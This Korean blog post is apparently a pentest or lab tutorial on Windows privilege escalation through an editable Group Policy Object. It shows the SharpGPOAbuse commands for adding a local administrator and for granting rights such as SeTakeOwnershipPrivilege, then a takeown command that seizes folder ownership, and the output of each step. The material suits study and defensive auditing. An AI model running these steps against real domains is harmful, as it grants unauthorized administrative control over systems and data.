---
layout: post
title: 윈도우 그룹폴리시 취약점점
subtitle: SharpGPOAbuse를 이용한 윈도우 권한 상승 방법법
category: knowledge
thumbnail-img: /assets/img/knowledge/sharp.webp
tags: [windows, GPO, grouppolicy, sharpgpoabuse]
author: Hong
---
윈도우 머신의 그룹 폴리시에 설정 미스가 있을 때 이를 이용하여 권한을 상승시킬 수 있다.
# Group policy 확인
`Get-Gpo -All`명령어로 리스트를 확인할 수 있다.
```powershell
DisplayName      : Default Domain Policy
DomainName       : test.com
Owner            : TEST\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 8/5/2022 6:20:58 PM
ModificationTime : 10/25/2022 5:39:34 PM
UserVersion      : AD Version: 3, SysVol Version: 3
ComputerVersion  : AD Version: 70, SysVol Version: 70
WmiFilter        :

DisplayName      : Default Domain Controllers Policy
DomainName       : test.com
Owner            : TEST\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 8/5/2022 6:20:58 PM
ModificationTime : 10/25/2022 5:34:04 PM
UserVersion      : AD Version: 1, SysVol Version: 1
ComputerVersion  : AD Version: 2, SysVol Version: 2
WmiFilter        :
```
두개가 나오는데 이 중 위의 폴리시의 권한을 확인해보겠다.
```
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName <유저명>

Trustee     : TEST
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False
```
위의 퍼미션을 보면 Edit가 가능한 것을 알 수 있다.

이 그룹 폴리시를 수정해서 유저의 권한을 상승시킬 수 있다.

# 권한 상승 및 추가
`.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <유저명> --GPOName "Default Domain Policy"`

위에서 발견한 폴리시 이름을 GPOName에 넣고 추가할 유저를 적는다.

변경 사항을 적용시키기 위해 `gpupdate /force`를 입력.

그 후`net localgroup administrators` 명령어로 로컬 그룹 관리자 리스트를 확인해보면 새롭게 유저가 추가 된 것을 확인할 수 있다.

그 외에도 원하는 특권을 추가시키는 것도 가능하다. 

예를들어, 아래는 추가 전 현재 가지고 있는 특권들의 리스트.
```powershell
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```
이제 새로운 특권들을 추가해보겠다.
```powershell
./SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount charlotte --GPOName "Default Domain Policy"
```
위와 같이 추가해준 다음 `gpupdate /force`을 입력 후 유저를 한 번 로그아웃 한다. 그리고 다시 로그인하면 새롭게 특권들이 추가된 것을 확인할 수 있다.
```powershell
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```
이렇게나 많은 권한들이 추가된 것을 알 수 있다! 

새로 생긴 특권들을 이용하여 다음 명령어를 사용하면 폴더의 권한을 빼앗는 것까지 가능하다.
`takeown /F "C:\Users\Path-With-No-Permission" /A /R /D Y`

초기 진입 후 권한 상승시 그룹 폴리시를 확인해 볼 것!